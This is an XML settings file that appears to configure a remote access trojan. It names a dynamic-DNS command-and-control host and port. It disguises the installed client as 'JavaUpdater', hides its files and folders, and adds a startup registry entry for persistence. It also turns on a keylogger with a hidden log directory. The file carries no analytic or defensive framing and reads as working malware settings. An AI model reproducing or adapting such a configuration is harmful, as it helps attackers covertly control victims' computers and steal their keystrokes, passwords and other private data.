<settings>
  <Tag>Office04</Tag>
  <Hosts>waweuw.ddns.net:4782;</Hosts>
  <Delay>3000</Delay>
  <Mutex>6e8122f4-3234-4982-98a3-24989895a216</Mutex>
  <UnattendedMode>False</UnattendedMode>
  <InstallClient>True</InstallClient>
  <InstallName>JavaUpdater</InstallName>
  <InstallPath>3</InstallPath>
  <InstallSub>SubDir</InstallSub>
  <HideFile>True</HideFile>
  <HideSubDirectory>True</HideSubDirectory>
  <AddStartup>True</AddStartup>
  <RegistryName>JavaUpdater</RegistryName>
  <ChangeIcon>False</ChangeIcon>
  <IconPath>
  </IconPath>
  <ChangeAsmInfo>False</ChangeAsmInfo>
  <Keylogger>True</Keylogger>
  <LogDirectoryName>Logs</LogDirectoryName>
  <HideLogDirectory>True</HideLogDirectory>
  <ProductName>
  </ProductName>
  <Description>
  </Description>
  <CompanyName>
  </CompanyName>
  <Copyright>
  </Copyright>
  <Trademarks>
  </Trademarks>
  <OriginalFilename>
  </OriginalFilename>
  <ProductVersion>
  </ProductVersion>
  <FileVersion>
  </FileVersion>
</settings>